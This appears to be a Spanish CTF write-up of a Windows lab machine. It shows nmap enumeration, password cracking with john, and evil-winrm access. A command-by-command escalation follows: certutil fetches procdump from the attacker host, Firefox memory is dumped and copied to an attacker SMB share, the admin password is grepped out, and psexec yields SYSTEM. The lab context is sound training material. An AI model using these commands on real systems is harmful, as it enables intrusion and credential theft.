# Enumeración

````

└─$ sudo nmap -sVC -p- -T4 --min-rate=5000 -sS -Pn 10.129.101.177
[sudo] contraseña para liamibanez: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-17 09:23 +0100
Nmap scan report for 10.129.101.177
Host is up (0.046s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-17T08:24:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.47 seconds

````
Miramos el support y tenemos password y user en type 7 que es crackeable 

````
$uperP@ssword
````

````
Q4)sJu\Y8qz*A3?d
````

Ahora el username: 
````
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /home/liamibanez/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:13 DONE (2026-11-17 09:41) 0.07189g/s 251994p/s 251994c/s 251994C/s steaua17..steall3
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
````
````
evil-winrm -i 10.129.101.177 -u chase -p 'Q4)sJu\Y8qz*A3?d'

````
<img width="658" height="433" alt="image" src="https://github.com/user-attachments/assets/815d99a7-d969-4896-9b4a-190b9ca5e449" />



````

####### HEIST — Chase → SYSTEM (volcado de Firefox) #######
# KALI=10.10.14.65   VICTIMA=10.129.101.177

### 1. SHELL COMO CHASE (credenciales ya conseguidas antes) ###
evil-winrm -i 10.129.101.177 -u Chase -p 'PASS_DE_CHASE'

### 2. DETECTAR EL FIREFOX ABIERTO (el admin dejó una sesión) ###
Get-Process firefox          # varios PID -> coge el que MÁS memoria usa (el principal, 6460)

### 3. SUBIR PROCDUMP Y VOLCAR FIREFOX ###
# (no hace falta admin: el proceso es de Chase)
# --- KALI ---
wget https://download.sysinternals.com/files/Procdump.zip -O Procdump.zip
unzip Procdump.zip -d procdump ; cd procdump ; python3 -m http.server 80
# --- VÍCTIMA ---
certutil -urlcache -f http://10.10.14.65/procdump64.exe C:\Windows\Temp\pd.exe
C:\Windows\Temp\pd.exe -accepteula -ma 6460 C:\Windows\Temp\firefox.dmp   # ~503 MB

### 4. SACAR EL .DMP A KALI POR SMB ###
# (el 'download' de evil-winrm rompe con ficheros grandes / Constrained Language Mode)
# --- KALI ---
impacket-smbserver share $(pwd) -smb2support -user df -password df
# --- VÍCTIMA ---
net use \\10.10.14.65\share /user:df df
copy C:\Windows\Temp\firefox.dmp \\10.10.14.65\share\firefox.dmp

### 5. BUSCAR LA PASS DEL ADMIN EN EL VOLCADO (KALI) ###
strings -e l firefox.dmp | grep -i "login_password"
#   -> login_password=4dD!5}x/re8]FBuZ&login=login
#   la pass es SOLO hasta el siguiente '&' :  4dD!5}x/re8]FBuZ

### 6. ENTRAR COMO ADMINISTRATOR (credencial reutilizada) → SYSTEM ###
nxc smb 10.129.101.177 -u administrator -p '4dD!5}x/re8]FBuZ'      # Pwn3d! = vale
impacket-psexec administrator:'4dD!5}x/re8]FBuZ'@10.129.101.177    # shell de SYSTEM
whoami
type C:\Users\Administrator\Desktop\root.txt
````
















